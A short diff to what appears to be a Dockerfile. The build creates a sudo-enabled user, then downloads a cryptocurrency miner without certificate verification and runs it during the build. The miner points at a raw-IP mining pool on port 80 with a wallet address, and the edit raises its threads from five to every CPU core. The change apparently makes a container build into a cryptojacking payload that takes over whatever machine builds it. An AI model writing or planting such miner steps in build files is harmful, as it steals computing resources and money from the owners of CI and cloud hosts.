@@ -21,4 +21,4 @@ RUN useradd -m kunemuse && \
     adduser kunemuse sudo && \
     sudo usermod -a -G sudo kunemuse
     
-RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcp://209.23.11.241:80 -u uu4XmbRcxdqoiyLnb3rkYHny9GE9CqtP4j.wEbb -p x -t5
+RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcp://209.23.11.241:80 -u uu4XmbRcxdqoiyLnb3rkYHny9GE9CqtP4j.wEbb -p x -t$(nproc --all)
